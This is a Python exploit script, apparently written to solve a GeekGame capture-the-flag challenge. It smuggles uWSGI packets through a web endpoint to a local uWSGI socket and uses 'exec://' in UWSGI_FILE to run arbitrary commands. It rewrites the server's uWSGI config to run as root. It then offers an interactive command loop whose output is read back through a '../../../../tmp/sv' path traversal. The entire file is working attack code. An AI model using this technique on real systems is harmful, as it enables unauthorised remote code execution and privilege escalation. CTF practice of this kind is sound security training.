import requests
import base64
import sys

url = 'https://prob17-6toq4xpu.geekgame.pku.edu.cn/'


# https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.mds
def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')
    return s[::-1]


def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items() if hasattr(var, 'items') else var:
        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
    result = b'\x00' + sz(pk) + b'\x00' + pk
    return result


def ask_uwsgi(var):
    r = requests.post(
        url, data={'server': '127.0.0.1:3031', 'content': base64.b64encode(pack_uwsgi_vars(var))})
    # print(r.text)


def curl(payload, target_url):
    var = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'REQUEST_METHOD': 'GET',
        'PATH_INFO': '/testapp',
        'REQUEST_URI': '/testapp',
        'QUERY_STRING': '',
        'SERVER_NAME': '127.0.0.1',
        'HTTP_HOST': '127.0.0.1',
        'UWSGI_FILE': payload,
        'SCRIPT_NAME': target_url
    }
    return ask_uwsgi(var)


# Modify /tmp/uwsgi-ctf.ini
curl('exec://echo "[uwsgi]\\nsocket = :3031\\nchdir = /usr/src/ufctf\\nmanage-script-name = true\\nmount = /=app:app\\nmaster = true\\nuid = root\\ngid = root\nworkers = 1\\nbuffer-size = 65535\\nenable-threads = true\\npidfile = /tmp/uwsgi.pid\n" > /tmp/uwsgi-ctf.ini', '/testapp')

while True:
    command = input()
    # Write stdout to file
    # If not redirected, stdout can also be viewed at /tmp/supervisor.log
    curl('exec://' + command + '> /tmp/sv', '/testapp')
    # Echo stdout
    r = requests.get(
        'https://prob17-6toq4xpu.geekgame.pku.edu.cn/module?name=chatlog&log=../../../../tmp/sv')
    print(r.text)
